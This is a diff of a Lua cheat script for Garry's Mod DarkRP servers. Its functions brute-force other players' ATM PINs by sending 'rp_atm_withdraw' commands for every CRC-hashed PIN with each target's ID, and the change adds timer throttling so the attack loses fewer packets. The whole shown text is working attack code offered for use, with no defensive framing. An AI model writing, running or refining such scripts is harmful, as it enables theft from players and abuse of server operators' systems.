@@ -2,6 +2,7 @@
 Lennys Scripts by Lenny. (STEAM_0:0:30422103)
 This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-sa/3.0/.
 Credit to the author must be given when using/sharing this work or derivative work from it.
+Thanks to Meepdarkeness for reducement of packet loss
 ]]
 
 
@@ -31,7 +32,7 @@ local function bruteforceall( ply, cmd, args )
 	MsgC(Color(0,255,0), "\nBruteforcing...\n")
 	for k, v in pairs(player.GetAll()) do
 		for _, pin in pairs(pintable) do
-			timer.Simple(tonumber(pin)*.015, function()
+			timer.Simple(tonumber(pin)*.015, function() --thx meepdarkness, keep in mind that multiplication is faster than divison
 			RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[1])
 			end)
 		end
@@ -43,7 +44,9 @@ local function bruteforceply( ply, cmd , args )
 	for k, v in pairs(player.GetAll()) do
 		if string.lower(v:Name()) == string.lower(args[1]) then
 			for _, pin in pairs(pintable) do
+				timer.Simple(tonumber(pin)*.015, function()
 				RunConsoleCommand("rp_atm_withdraw", util.CRC(pin), v:UniqueID(), args[2])
+				end)
 			end
 		end
 	end
